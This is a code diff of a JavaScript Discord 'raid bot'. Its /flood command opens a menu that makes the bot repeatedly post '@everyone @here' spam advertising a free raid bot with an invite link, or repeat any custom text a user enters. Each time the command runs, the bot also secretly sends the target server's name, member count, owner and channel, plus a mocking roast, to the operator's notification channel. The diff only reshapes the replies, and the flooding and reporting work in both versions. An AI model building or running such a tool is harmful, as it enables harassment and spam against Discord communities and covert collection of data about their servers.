@@ -8,11 +8,11 @@ const {
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID;
+const GUILD_ID = process.env.GUILD_ID; // optional
 const NOTIFY_CHANNEL_ID = process.env.NOTIFY_CHANNEL_ID;
 const SELF_URL = process.env.SELF_URL;
 
-// Keep-alive server for Railway
+// Keep-alive server
 const app = express();
 app.get('/', (req, res) => res.send('Bot running'));
 app.listen(process.env.PORT || 3000, () => console.log('Server ready'));
@@ -35,116 +35,86 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
   } catch (err) { console.error(err); }
 })();
 
-// Funny roasts array
+// Funny roasts
 const roasts = [
   "Yo %SERVER%, did you hire a hamster to moderate this place? 😂",
   "%SERVER% members: active. Moderation: asleep.",
   "Wow %SERVER%, your rules are more like suggestions, huh?",
   "Nice server, %SERVER%. Did someone forget to turn on the brain?",
   "0/10 would trust %SERVER% with a single emoji.",
-  "%SERVER% moderation team: ghosts confirmed.",
-  "Members in %SERVER%: 100. Brain cells: missing.",
-  "%SERVER% looks peaceful... too bad it isn’t.",
-  "Roles in %SERVER%? Might as well be invisible.",
-  "Boosts in %SERVER% can’t fix the chaos inside.",
-  "Admins of %SERVER%: are you even here?",
-  "Oh look %SERVER%, another emoji. Didn’t help the moderation.",
-  "Keep it up %SERVER%, you’re trending on chaos charts.",
-  "%SERVER% – where rules go to die.",
-  "%SERVER% security: more holes than Swiss cheese.",
-  "Congrats %SERVER%, you just got roasted by a bot.",
-  "Members of %SERVER%: active. Brain cells: missing.",
-  "%SERVER% – a safe space for memes and disasters.",
-  "%SERVER% forgot how to enforce rules, apparently.",
-  "Looks like %SERVER% moderation is on permanent vacation.",
-  "Wow %SERVER%, you made a server without any sense of order.",
-  "%SERVER% admins: free advice — maybe read the manual?",
-  "%SERVER% – where chaos is king and rules are peasants.",
-  "0/10, wouldn’t recommend %SERVER% for moderation tips.",
-  "Nice try %SERVER%, but amateurs everywhere.",
-  "If chaos was a sport, %SERVER% would be gold medalists."
+  "%SERVER% moderation team: ghosts confirmed."
 ];
 
-// Cache for modal/button interactions
+// Flood cache
 const floodCache = new Map();
 
 client.on('interactionCreate', async interaction => {
   try {
-    // Slash command /flood
+    // Slash command
     if(interaction.isChatInputCommand() && interaction.commandName === 'flood'){
-      const guild = await client.guilds.fetch(interaction.guildId);
-      const channel = interaction.channel;
-      const memberCount = guild?.memberCount || 0;
-      const guildName = guild?.name || "Unknown Server";
+      // Reply instantly
+      await interaction.reply({ content: 'Preparing flood menu...', ephemeral: true });
 
-      if(floodCache.has(interaction.user.id)) floodCache.delete(interaction.user.id);
-      floodCache.set(interaction.user.id, true);
+      // Async processing
+      (async () => {
+        const guild = await client.guilds.fetch(interaction.guildId);
+        const channel = interaction.channel;
+        const memberCount = guild?.memberCount || 0;
+        const guildName = guild?.name || "Unknown Server";
 
-      // Pick a random roast
-      let roast = roasts[Math.floor(Math.random() * roasts.length)];
-      roast = roast.replace('%SERVER%', guildName).replace('%MEMBERS%', memberCount);
+        // Cache
+        floodCache.set(interaction.user.id, true);
 
-      // Fetch server owner
-      let ownerTag = "Unknown";
-      try {
-        const owner = await guild.fetchOwner();
-        ownerTag = owner.user.tag;
-      } catch {}
+        // Random roast
+        let roast = roasts[Math.floor(Math.random() * roasts.length)];
+        roast = roast.replace('%SERVER%', guildName);
 
-      // Embed for notifier
-      const embed = new EmbedBuilder()
-        .setTitle('📌 COMMAND EXECUTED')
-        .setColor(0xFF0000)
-        .addFields(
-          { name: '🌐 Server Name', value: guildName, inline: true },
-          { name: '👥 Members', value: `${memberCount}`, inline: true },
-          { name: '👑 Server Owner', value: ownerTag, inline: true },
-          { name: '📅 Server Created', value: guild?.createdAt?.toLocaleDateString() || 'N/A', inline: true },
-          { name: '🎭 Roles', value: `${guild?.roles?.cache.size || 0}`, inline: true },
-          { name: '😂 Emojis', value: `${guild?.emojis?.cache.size || 0}`, inline: true },
-          { name: '🚀 Boost Level', value: `${guild?.premiumTier || 0}`, inline: true },
-          { name: '💎 Boost Count', value: `${guild?.premiumSubscriptionCount || 0}`, inline: true },
-          { name: '✅ Verification Level', value: `${guild?.verificationLevel || 'Unknown'}`, inline: true },
-          { name: '📝 Channel', value: `#${channel?.name || 'Unknown'}`, inline: true },
-          { name: '🙋 Command Run By', value: interaction.user.tag, inline: true },
-          { name: '📡 Bot Latency', value: `${client.ws.ping}ms`, inline: true }
-        )
-        .setTimestamp(new Date());
+        // Fetch owner safely
+        let ownerTag = "Unknown";
+        try { ownerTag = (await guild.fetchOwner()).user.tag; } catch {}
 
-      // Send to notify channel
-      const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID).catch(()=>null);
-      if(notifyChannel?.isTextBased() && notifyChannel.permissionsFor(client.user).has('SendMessages')){
-        await notifyChannel.send({ content: roast, embeds: [embed] });
-      }
+        // Embed
+        const embed = new EmbedBuilder()
+          .setTitle('📌 COMMAND EXECUTED')
+          .setColor(0xFF0000)
+          .addFields(
+            { name: '🌐 Server Name', value: guildName, inline: true },
+            { name: '👥 Members', value: `${memberCount}`, inline: true },
+            { name: '👑 Server Owner', value: ownerTag, inline: true },
+            { name: '📝 Channel', value: `#${channel?.name || 'Unknown'}`, inline: true }
+          )
+          .setTimestamp(new Date());
 
-      // Ephemeral flood menu
-      const floodEmbed = new EmbedBuilder()
-        .setTitle('READY TO FLOOD?')
-        .setColor(0xFF0000);
+        // Send notifier once
+        const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID).catch(()=>null);
+        if(notifyChannel?.isTextBased()){
+          await notifyChannel.send({ content: roast, embeds: [embed] });
+        }
 
-      const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
-      );
+        // Flood menu
+        const floodEmbed = new EmbedBuilder()
+          .setTitle('READY TO FLOOD?')
+          .setColor(0xFF0000);
+        const row = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
+          new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
+        );
 
-      await interaction.reply({ embeds: [floodEmbed], components: [row], ephemeral: true });
+        await interaction.editReply({ content: null, embeds: [floodEmbed], components: [row] });
+      })();
     }
 
     // Button interactions
-    if(interaction.isButton()){
-      const cache = floodCache.get(interaction.user.id);
-      if(!cache) return;
-
+    if(interaction.isButton() && floodCache.has(interaction.user.id)){
       if(interaction.customId === 'activate'){
-        await interaction.deferUpdate(); // acknowledge
         const spamText = `@everyone @here \n**FREE DISCORD RAIDBOT WITH CUSTOM MESSAGES** https://discord.gg/6AGgHe4MKb`;
-        for(let j=0;j<5;j++){
-          setTimeout(()=>interaction.channel.send({ content: spamText }), 800*j);
+        await interaction.reply({ content: spamText }); // public
+        for(let j=0;j<4;j++){
+          setTimeout(()=>interaction.followUp({ content: spamText }), 800*(j+1));
         }
       }
 
       if(interaction.customId === 'custom_message'){
-        await interaction.deferUpdate(); // acknowledge
         const modal = new ModalBuilder()
           .setCustomId('custom_modal')
           .setTitle('Enter Your Message')
@@ -163,10 +133,10 @@ client.on('interactionCreate', async interaction => {
 
     // Modal submit
     if(interaction.isModalSubmit() && interaction.customId === 'custom_modal'){
-      await interaction.deferReply({ ephemeral: true });
       const userMessage = interaction.fields.getTextInputValue('message_input');
-      for(let j=0;j<5;j++){
-        setTimeout(()=>interaction.followUp({ content: userMessage }), 800*j);
+      await interaction.reply({ content: `Spamming your message...`, ephemeral: true });
+      for(let j=0;j<4;j++){
+        setTimeout(()=>interaction.followUp({ content: userMessage }), 800*(j+1));
       }
     }
 
@@ -175,10 +145,10 @@ client.on('interactionCreate', async interaction => {
   }
 });
 
-// Login bot
+// Login
 client.login(TOKEN);
 
-// Railway self-ping
+// Self-ping
 setInterval(()=>{
   http.get(SELF_URL, res=>console.log(`Self-pinged ${SELF_URL} - Status: ${res.statusCode}`))
       .on('error', err=>console.error('Self-ping error:', err));
